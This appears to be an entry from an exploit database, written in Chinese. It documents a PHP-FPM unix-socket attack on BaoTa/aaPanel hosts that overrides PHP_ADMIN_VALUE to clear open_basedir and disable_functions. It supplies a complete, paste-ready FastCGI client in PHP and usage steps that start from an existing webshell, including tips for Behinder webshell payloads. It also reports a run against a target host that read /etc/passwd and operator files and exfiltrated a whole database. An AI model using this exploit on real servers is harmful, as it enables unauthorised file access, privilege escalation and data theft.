# PHP-FPM unix socket 未授权 + PHP_ADMIN_VALUE 清空 open_basedir/disable_functions → 全盘任意文件读写（宝塔环境通用）

- **code**: php-fpm-unix-socket-未授权-php_admin_value-清空-open_basedir-disable_functions-全盘任意文件
- **kind**: exp
- **category**: privesc
- **component**: PHP-FPM (php-cgi unix socket)
- **versions**: 宝塔/aaPanel 默认 PHP-FPM 配置（php-cgi-*.sock 在 /tmp，mode 0666）；PHP 5.x–8.x 同理，仅 cipher 名与函数剥离情况不同
- **severity**: critical
- **language**: php
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.101（宝塔 + PHP 5.6.40，open_basedir=/www/wwwroot/thisthbweb_com/:/tmp/）实测通过：OB=/ DISLEN=0，/etc/passwd 与 /www/myself/* 完整读出，today 库 5,392,948 字节整库外带（md5 4ec6e4da70b3bf773b059eeb8afcef5d）。无需认证，仅需已有站点内 PHP 执行点。
- **path**: pocs/php-fpm-unix-socket-未授权-php_admin_value-清空-open_basedir-disable_functions-全盘任意文件/phpfpm_fcgi_open_basedir_bypass.php
- **tags**: php-fpm,fastcgi,open_basedir,宝塔,bypass,任意文件读写
- **created_at**: 2026-10-13T12:27:45.592Z
- **found_by**: internal

## 描述

只要站点内有一个受 open_basedir 限制的 PHP 执行点，且 php-fpm 监听未授权的 unix socket，就能借 PHP_ADMIN_VALUE 清空 open_basedir / disable_functions，得到全盘任意文件读写（宝塔环境默认命中）。含可直接粘贴的 FastCGI 帧构造代码与两个必踩的坑。

## 用法

```
1) 先用 fsockopen("unix:///tmp/php-cgi-<ver>.sock") 确认 socket 可达（注意 open_basedir 需含 /tmp）
2) 把 payload PHP（首行 <?php）写到 /tmp/payload.php
3) 把本 POC 的 driver 写成 /tmp/fcgi_drv.php，SCRIPT_FILENAME 指向 payload
4) 在已有执行点里 @include "/tmp/fcgi_drv.php";
5) 剥掉响应首部的 CGI 头即得 payload 的原始输出
参考实现：runs/176/fcgi_run.py、runs/176/f_fcgi_drv2.php、runs/176/fetch_remote.py
```

## 正文

```
## 背景 / 适用面
任何"站点内已有一个受 open_basedir 限制的 PHP 执行点（WebShell / 上传马 / 模板注入）"，且主机上存在 php-fpm 的 **unix socket**（宝塔默认 /tmp/php-cgi-<ver>.sock，mode 0666，无认证）的场景。
与常见误区：**open_basedir 会检查 unix socket 路径，但如果 open_basedir 里包含 /tmp（宝塔默认就是 `<site>:/tmp/`），socket 是可达的。**
先验证可达性，再决定放弃：
```php
$s=@fsockopen("unix:///tmp/example.com",-1,$e1,$e2,3);
echo ($s?"FSOCK_OK":"FSOCK_FAIL")." ".$e1." ".$e2;
```

## 关键前提（务必先确认）
1. PHP 5.6.40 上 cipher 名必须写 `aes-128-ecb`（`AES128` 不在 openssl_get_cipher_methods()）；
2. **冰蝎马 payload 里绝不能出现裸竖线 `|`**，马体是 `explode('|')` 取参 —— 出现竖线会截断且输出全空，极易误判为"马死了/环境不通"。需要竖线时用 `chr(124)`；
3. `PHP_ADMIN_VALUE` 可在请求级覆盖 open_basedir / disable_functions，但 **exec/system/shell_exec 等函数在 MINIT 阶段已被剥离，覆盖不回来** ⇒ 得到的是"任意文件读写"，不是命令执行。

## FastCGI 客户端（PHP 版，可整段 eval / include 到目标上执行）
```php
function fcgi_nv($n,$v){
  $r=""; $ln=strlen($n); $lv=strlen($v);
  $r .= $ln<128 ? chr($ln) : chr(($ln>>24)&255).chr(($ln>>16)&255).chr(($ln>>8)&255).chr($ln&255);
  $r .= $lv<128 ? chr($lv) : chr(($lv>>24)&255).chr(($lv>>16)&255).chr(($lv>>8)&255).chr($lv&255);
  return $r.$n.$v;
}
function fcgi_h($t,$c){ $l=strlen($c); $p=(8-($l%8))%8;
  return chr(1).chr($t).chr(0).chr(1).chr(($l>>8)&255).chr($l&255).chr($p).chr(0).$c.str_repeat(chr(0),$p); }
$params=array(
  "GATEWAY_INTERFACE"=>"FastCGI/1.0","REQUEST_METHOD"=>"GET",
  "SCRIPT_FILENAME"=>"/tmp/payload.php","SCRIPT_NAME"=>"/payload.php",
  "QUERY_STRING"=>"","REQUEST_URI"=>"/payload.php","DOCUMENT_ROOT"=>"/tmp",
  "SERVER_PROTOCOL"=>"HTTP/1.0","REMOTE_ADDR"=>"127.0.0.1","REMOTE_PORT"=>"44444",
  "SERVER_ADDR"=>"127.0.0.1","SERVER_PORT"=>"80","SERVER_NAME"=>"localhost",
  "SERVER_SOFTWARE"=>"nginx","CONTENT_LENGTH"=>"0",
  "PHP_ADMIN_VALUE"=>"open_basedir=/\ndisable_functions=\n",
  "PHP_VALUE"=>"open_basedir=/\ndisable_functions=\n");
$s=fsockopen("unix:///tmp/example.com",-1,$e1,$e2,5); stream_set_timeout($s,120);
fwrite($s, fcgi_h(1, chr(0).chr(1).chr(0).str_repeat(chr(0),5)));  // BEGIN_REQUEST role=RESPONDER
$blob=""; foreach($params as $k=>$v) $blob.=fcgi_nv($k,$v);
fwrite($s, fcgi_h(4,$blob)); fwrite($s, fcgi_h(4,"")); fwrite($s, fcgi_h(5,""));
$out="";
while(!feof($s)){ $h=fread($s,8); if(strlen($h)<8) break;
  $t=ord($h[1]); $len=(ord($h[4])<<8)+ord($h[5]); $pad=ord($h[6]);
  $c=""; $need=$len; while($need>0){ $b=fread($s,$need); if($b===false||$b==="") break; $c.=$b; $need-=strlen($b); }
  if($pad>0) fread($s,$pad);
  if($t==6) $out.=$c; elseif($t==3) break; }
fclose($s);
echo $out;   // 其中第一段是 php-fpm 生成的 CGI 头（Content-type: ...\r\n\r\n），需要剥掉
```

## 使用步骤
1. 用已有执行点把任意大小的 payload PHP（**首行必须 `<?php`**）base64 写成 `/tmp/payload.php`；
2. 把上面的 driver 也写成 `/tmp/fcgi_drv.php`（改 `SCRIPT_FILENAME`）；
3. 执行 `@include "/tmp/fcgi_drv.php";` ⇒ payload 在 `open_basedir=/`、`disable_functions=` 空 的上下文里运行，STDOUT 原样回传；
4. 读大文件：让 payload 输出 `base64_encode(substr(file_get_contents($f), $off, $len))`，本机按 1~1.2MB 分块循环拉取，单次不要指望一次拉完。

## 验证证据（本演练）
目标 203.0.113.101：
```
FSOCK_OK
OB=/   DISLEN=0   PHP=5.6.40   WHO=www
FN_exec=0 FN_system=0 FN_shell_exec=0 FN_popen=0 FN_proc_open=0 FN_pcntl_exec=0
FN_mail=1 FN_curl_init=1 FN_mysqli_connect=1
/etc/passwd 990 字节完整读出
/www/wwwroot 枚举出 3 个站点；/www/myself/* 运营方工具包整包读出；today 库整库 5,392,948 字节外带成功
```
注意：文件系统 DAC 仍然生效（`/root`、`/www/server/panel/data/*` 对 uid www 不可读）——**DAC ≠ open_basedir，别混为一谈**。
```
